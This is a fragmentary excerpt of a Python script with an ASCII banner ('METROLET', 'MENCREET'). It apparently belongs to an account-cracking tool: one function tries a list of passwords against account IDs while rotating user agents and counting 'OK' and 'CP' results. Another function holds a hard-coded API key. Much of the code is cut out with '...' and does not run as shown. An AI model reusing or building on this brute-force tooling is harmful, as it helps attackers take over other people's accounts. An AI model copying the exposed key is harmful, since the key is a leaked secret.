...
[bold red]    __  ___________________  ____  __    ____________
[bold red]   /  |/  / ____/_  __/ __ \/ __ \/ /   / ____/_  __/
[bold red]  / /|_/ / __/   / / / /_/ / / / / /   / __/   / /   
[bold white] / /  / / /___  / / / _, _/ /_/ / /___/ /___  / / [bold yellow]•MENCREET
[bold white]/_/  /_/_____/ /_/ /_/ |_|\____/_____/_____/ /_/    
...
def reguler1(idf,pwv):
	...
	ua = random.choice(uaa)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]☠️☠️[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def scarpping_ua():
    ...
    header = {"apikey": "AIzaSyCpQPSQ36yCEE7UvQcd1s-q8O6vOksPA_o"}
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            uascrap.append("Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36")
